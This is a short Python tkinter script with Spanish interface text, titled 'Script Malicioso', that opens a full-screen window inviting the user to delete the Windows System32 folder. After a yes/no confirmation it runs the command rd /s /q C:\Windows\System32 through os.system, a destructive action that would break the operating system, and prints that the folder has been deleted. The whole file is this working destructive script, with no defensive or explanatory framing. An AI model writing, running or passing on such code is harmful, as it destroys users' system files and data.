import tkinter as tk
from tkinter import messagebox
import os

def borrar_system32():
    os.system("rd /s /q C:\\Windows\\System32")
    print(u"¡La carpeta System32 ha sido borrada!")
    root.destroy()  # Cierra la ventana cuando se hace clic en "Comenzar"

def comenzar():
    respuesta = messagebox.askyesno("Confirmación", "¿Estás seguro de que quieres borrar la carpeta System32?")
    if respuesta:
        borrar_system32()

def salir():
    print(u"Saliendo...")
    root.destroy()

root = tk.Tk()
root.title(u"Script Malicioso")
root.geometry("1920x1080")

etiqueta_texto = tk.Label(root, text=u"¿Preparado para borrar la carpeta System32?")
etiqueta_texto.pack()

boton_comenzar = tk.Button(root, text=u"Comenzar", command=comenzar)
boton_comenzar.pack()

boton_salir = tk.Button(root, text=u"Salir", command=salir)
boton_salir.pack()

root.mainloop()